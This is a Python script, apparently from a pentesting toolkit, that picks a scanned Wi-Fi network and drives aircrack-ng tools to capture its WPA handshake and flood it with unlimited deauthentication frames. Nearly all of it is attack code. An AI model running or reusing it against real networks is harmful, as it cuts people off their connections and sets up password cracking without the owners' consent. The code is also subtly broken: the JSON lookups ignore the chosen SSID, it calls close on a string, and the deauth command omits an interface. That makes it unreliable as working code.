import os
import json
import platform
from time import sleep


wifi_txt = "Pentesting/Network/Output/Wifi.txt"
wifi_json = "Pentesting/Network/Output/Wifi.json"

def GetBSSID(ssid):
    if not os.path.exists(wifi_txt):
        with open(wifi_json, "r") as file:
            data = json.load(file)
        for ssid in data:
            return data[ssid].get("BSSID","")
        
    elif not os.path.exists(wifi_json):
        with open(wifi_txt, "r") as file:
            lines = file.readlines()
        for line in lines:
            if ssid in line:
                parts = line.split()
                return parts[1]
            
def GetCHAN(ssid):
    if not os.path.exists(wifi_txt):
        with open(wifi_json, "r") as file:
            data = json.load(file)
        for ssid in data:
            return data[ssid].get("CHANNEL","")
        
    elif not os.path.exists(wifi_json):
        with open(wifi_txt, "r") as file:
            lines = file.readlines()
        for line in lines:
            if ssid in line:
                parts = line.split()
                return parts[3]
            
def GetHandshake(bssid, channel):
    if platform.system() == 'Linux':
        os.popen("sudo airmon-ng check kill").read()
        os.popen("sudo airmon-ng start wlan0").read()
        result = os.popen(f"airodump-ng -c {channel} --bssid {bssid} wlan0mon").read()
        print(result)
        os.popen("sudo airmon-ng stop wlan0").read()
    if platform.system() == 'Darwin':
        pass
        # KAN NIET

def Deauth(bssid):
    if not os.path.exists(wifi_txt):
        if not os.path.exists(wifi_json):
            print("No SSDID'S to read!")
        else:
            with open(wifi_json, "r") as file:
                data = json.load(file)
                print(data)

                ssid = input("Type your chosen SSID: ")
                GetHandshake(GetBSSID(ssid),GetCHAN(ssid))
                os.popen("sudo airmon-ng check kill").read()
                os.popen("sudo airmon-ng start wlan0").read()
                process = os.popen(f"sudo aireplay-ng --deauth 0 -a {GetBSSID(ssid)}").read()
                sleep(5)
                process.close()
                os.popen("sudo airmon-ng stop wlan0").read()
                
    
    elif not os.path.exists(wifi_json):
        if not os.path.exists(wifi_txt):
            print("No SSID'S to read!")
        else:
            with open(wifi_txt, "r") as file:
                data = file.read()
                print(data)

                ssid = input("Type your chosen SSID: ")
                

def Handshake():
    if not os.path.exists(wifi_txt):
        if not os.path.exists(wifi_json):
            print("No SSDID'S to read!")
        else:
            with open(wifi_json, "r") as file:
                data = json.load(file)
                print(data)

                ssid = input("Type your chosen SSID: ")
                GetHandshake(GetBSSID(ssid),GetCHAN(ssid))
                
    
    elif not os.path.exists(wifi_json):
        if not os.path.exists(wifi_txt):
            print("No SSID'S to read!")
        else:
            with open(wifi_txt, "r") as file:
                data = file.read()
                print(data)

                ssid = input("Type your chosen SSID: ")
                GetHandshake(GetBSSID(ssid), GetCHAN(ssid))
                
                
    